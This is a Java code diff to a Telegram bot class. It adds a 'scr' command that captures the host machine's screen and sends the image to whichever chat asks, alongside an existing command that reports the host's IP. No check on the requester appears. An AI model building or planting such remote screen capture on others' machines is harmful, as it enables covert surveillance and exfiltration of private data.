@@ -1,6 +1,8 @@
 package org.gvozdetscky.api;
 
 import org.gvozdetscky.util.InetIP;
+import org.gvozdetscky.util.SystemUtil;
+import org.telegram.telegrambots.api.methods.send.SendDocument;
 import org.telegram.telegrambots.api.methods.send.SendMessage;
 import org.telegram.telegrambots.api.objects.Update;
 import org.telegram.telegrambots.bots.TelegramLongPollingBot;
@@ -22,6 +24,10 @@ public class TelegramApi extends TelegramLongPollingBot {
             sendMsg(update.getMessage().getChatId().toString(), ip);
         }
 
+        if (message.equals("scr")) {
+            sendScreenshot(update.getMessage().getChatId().toString());
+        }
+
         System.out.println();
     }
 
@@ -31,8 +37,32 @@ public class TelegramApi extends TelegramLongPollingBot {
         sendMessage.enableMarkdown(true);
         sendMessage.setChatId(chatId);
         sendMessage.setText(msg);
+
+
         try {
+
+
             sendMessage(sendMessage);
+
+
+        } catch (TelegramApiException e) {
+            e.printStackTrace();
+        }
+
+    }
+
+    public synchronized void sendScreenshot(String chatId) {
+        SendDocument document = new SendDocument();
+        document.setChatId(chatId);
+        document.setNewDocument("screenshot.png", new SystemUtil().getInputStreamScreenShot());
+
+
+        try {
+
+
+            sendDocument(document);
+
+
         } catch (TelegramApiException e) {
             e.printStackTrace();
         }
